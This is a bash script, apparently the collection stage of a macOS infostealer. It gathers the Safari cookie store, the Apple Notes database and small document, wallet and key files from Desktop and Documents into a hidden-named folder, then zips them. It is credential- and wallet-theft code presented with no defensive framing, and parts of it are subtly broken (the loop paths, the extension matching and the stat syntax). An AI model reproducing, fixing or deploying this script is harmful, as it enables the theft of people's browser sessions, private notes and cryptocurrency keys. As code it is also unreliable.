#!/bin/bash

baseFolderPath="$HOME/1410861752"
fileGrabberFolderPath="$HOME/1410861752/FileGrabber"
safariFolderPath="$HOME/Library/Containers/com.apple.Safari/Data/Library/Cookies"
notesFolderPath="$HOME/Library/Group Containers/group.com.apple.notes"
zipFilePath="$HOME/1410861752/FileGrabber.zip"

mkdir -p "$fileGrabberFolderPath"

cp "$safariFolderPath/Cookies.binarycookies" "$fileGrabberFolderPath" 2>/dev/null
cp "$notesFolderPath/NoteStore.sqlite" "$fileGrabberFolderPath" 2>/dev/null

extensionsList=("txt" "docx" "rtf" "doc" "wallet" "keys" "key")
maxSize=51200

for file in "$HOME/Desktop/"; do
if [[ -f "$file" ]]; then
extension="${file##.}"
size=$(stat -c%s "$file")
if [[ " ${extensionsList[@]} " =~ " ${extension} " && $size -le $maxSize ]]; then
cp "$file" "$fileGrabberFolderPath"
fi
fi
done

for file in "$HOME/Documents/"; do
if [[ -f "$file" ]]; then
extension="${file##.}"
size=$(stat -c%s "$file")
if [[ " ${extensionsList[@]} " =~ " ${extension} " && $size -le $maxSize ]]; then
cp "$file" "$fileGrabberFolderPath"
fi
fi
done

zip -r "$zipFilePath" "$fileGrabberFolderPath"
